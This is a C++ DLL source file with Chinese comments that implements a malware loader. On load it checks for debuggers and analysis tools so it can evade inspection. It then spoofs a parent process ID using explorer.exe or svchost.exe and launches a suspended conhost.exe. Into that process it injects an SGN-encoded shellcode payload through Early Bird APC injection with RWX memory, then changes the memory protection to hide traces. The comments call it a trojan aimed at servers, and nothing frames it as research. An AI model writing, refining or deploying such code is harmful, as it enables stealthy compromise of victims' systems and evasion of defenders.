// dllmain.cpp - 重构版 (OS-Level Forwarding + Early Bird APC + PPID Spoofing)
#include <windows.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>
#include <string.h>

// ==========================================================
// Payload 配置区 (在此放入 SGN 编码后的数据)
// ==========================================================
unsigned char payload[] = "";
unsigned int payload_len = sizeof(payload) - 1;

// ==========================================================
// 环境画像检查 (多字节字符集通用版)
// ==========================================================
bool IsSafeAndTargetEnvironment() {
    bool isServer = false;
    bool isAnalystPresent = false;

    // A. 常见的后端服务器进程白名单
    const char* serverProcs[] = {
        "java.exe", "javaw.exe", "w3wp.exe", "httpd.exe", "nginx.exe",
        "mysqld.exe", "sqlservr.exe", "php-cgi.exe", "node.exe", "BtSoft.exe"
    };

    // B. 常见的分析工具黑名单
    const char* analystProcs[] = {
        "x64dbg.exe", "x32dbg.exe", "Wireshark.exe", "ProcessHacker.exe",
        "Procmon.exe", "ida64.exe", "ollydbg.exe"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {};
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                for (int i = 0; i < 7; i++) {
                    if (_stricmp(pe.szExeFile, analystProcs[i]) == 0) {
                        isAnalystPresent = true;
                        break;
                    }
                }
                if (isAnalystPresent) break;

                for (int i = 0; i < 10; i++) {
                    if (_stricmp(pe.szExeFile, serverProcs[i]) == 0) {
                        isServer = true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    if (isAnalystPresent) return false;

    // 兜底逻辑：为了测试方便，先锋马可以缩短时间或直接 return true;
    return true;
}

// ==========================================================
// 获取 explorer.exe 或 svchost.exe 的进程句柄 (用于 PPID 欺骗)
// ==========================================================
DWORD GetSpoofParentPID() {
    DWORD targetPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {};
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                // 优先选择 explorer.exe，其次 svchost.exe
                if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    targetPID = pe.th32ProcessID;
                    break;
                }
                if (targetPID == 0 && _stricmp(pe.szExeFile, "svchost.exe") == 0) {
                    targetPID = pe.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    return targetPID;
}

// ==========================================================
// Early Bird APC 注入 + PPID 欺骗
// ==========================================================
void ExecuteEarlyBirdInjection() {
    if (payload_len <= 1) return;

    char targetPath[MAX_PATH];
    if (GetSystemDirectoryA(targetPath, MAX_PATH)) {
        strcat_s(targetPath, "\\conhost.exe");
    } else {
        return;
    }

    // ===== 步骤 1: PPID 欺骗 - 获取伪造的父进程句柄 =====
    DWORD spoofPID = GetSpoofParentPID();
    if (spoofPID == 0) return;

    HANDLE hSpoofParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofPID);
    if (!hSpoofParent) return;

    // ===== 步骤 2: 初始化扩展的 STARTUPINFOEX 结构 =====
    SIZE_T attributeSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

    LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attributeSize
    );
    if (!pAttributeList) {
        CloseHandle(hSpoofParent);
        return;
    }

    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeSize)) {
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 3: 设置父进程属性 (PPID Spoofing 核心) =====
    if (!UpdateProcThreadAttribute(
        pAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hSpoofParent,
        sizeof(HANDLE),
        NULL,
        NULL
    )) {
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 4: 创建挂起的进程 (Early Bird 前提) =====
    STARTUPINFOEXA si = {};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = pAttributeList;

    PROCESS_INFORMATION pi = {};

    if (!CreateProcessA(
        NULL,
        targetPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi
    )) {
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 5: 在目标进程中分配 RWX 内存 =====
    void* remoteMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 6: 写入 Payload =====
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, payload, payload_len, &bytesWritten)) {
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 7: 使用 QueueUserAPC 插入执行流 (Early Bird 核心) =====
    if (QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0)) {
        // ===== 步骤 8: 唤醒线程，触发 APC 执行 =====
        ResumeThread(pi.hThread);

        // 给 SGN 留出解密时间
        Sleep(500);

        // 权限翻转: RWX -> RX (抹除高危痕迹)
        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, remoteMem, payload_len, PAGE_EXECUTE_READ, &oldProtect);
    } else {
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
    }

    // 清理资源
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteProcThreadAttributeList(pAttributeList);
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    CloseHandle(hSpoofParent);
}

// ==========================================================
// 后台线程入口 (防止 Loader Lock)
// ==========================================================
DWORD WINAPI BackgroundInjectionThread(LPVOID lpParam) {
    (void)lpParam;

    // 环境自检与注入
    if (IsSafeAndTargetEnvironment()) {
        ExecuteEarlyBirdInjection();
    }

    return 0;
}

// ==========================================================
// DLL 入口 (异步化，立即返回)
// ==========================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)lpReserved;
    (void)hModule;

    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // 创建后台线程执行注入逻辑，立即返回 (防止阻塞宿主进程)
        HANDLE hThread = CreateThread(NULL, 0, BackgroundInjectionThread, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    }

    return TRUE;
}
